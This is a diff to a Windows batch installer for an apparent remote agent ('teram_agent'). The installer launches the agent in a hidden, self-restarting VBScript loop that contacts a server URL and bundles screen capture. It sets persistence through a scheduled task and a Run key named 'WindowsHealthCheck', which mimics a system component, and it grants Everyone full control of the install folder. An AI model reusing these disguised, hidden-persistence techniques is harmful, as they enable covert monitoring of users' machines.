@@ -166,6 +166,7 @@ reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealt
 if exist "%INSTALL_DIR%" (
     attrib -h -s -r "%INSTALL_DIR%" /D /S >nul 2>&1
     takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
+    icacls.exe "%INSTALL_DIR%" /remove:d Everyone /T /C /Q >nul 2>&1
     icacls.exe "%INSTALL_DIR%" /grant Everyone:F /T /C /Q >nul 2>&1
     rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
 )
@@ -193,11 +194,12 @@ if %errorlevel% neq 0 (
     robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
 )
 
-:: Set up executable
 if exist "%~dp0teram_agent.exe" (
     copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
+    set "AGENT_ARGS=%SERVER_URL%"
 ) else (
     copy /Y "%~dp0node.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
+    set "AGENT_ARGS=index.js %SERVER_URL%"
 )
 
 :: Compile ScreenCap (keep bundled if fails)
@@ -264,7 +266,7 @@ echo  [6/8] Creating service and launching agent...
  echo Set W = CreateObject^("WScript.Shell"^)
  echo W.CurrentDirectory = "%INSTALL_DIR%"
  echo Do
- echo   W.Run chr^(34^) ^& "%INSTALL_DIR%\%BIN_NAME%" ^& chr^(34^) ^& " index.js %SERVER_URL%", 0, True
+ echo   W.Run chr^(34^) ^& "%INSTALL_DIR%\%BIN_NAME%" ^& chr^(34^) ^& " %AGENT_ARGS%", 0, True
  echo   WScript.Sleep 5000
  echo Loop
 ) > "%INSTALL_DIR%\service.vbs"
@@ -308,8 +310,8 @@ if "%ALLOW_AUTOSTART%"=="1" (
         echo        Scheduled Task : FAILED
     )
     echo  [~] Adding registry entry...
-    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul
-    echo        Registry Key    : OK
+    :: reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul
+    echo        Registry Key    : Skipped (Using Scheduled Task instead)
 ) else (
     echo  [*] Auto-start: Skipped (user declined).
     echo      Agent will NOT survive reboots.
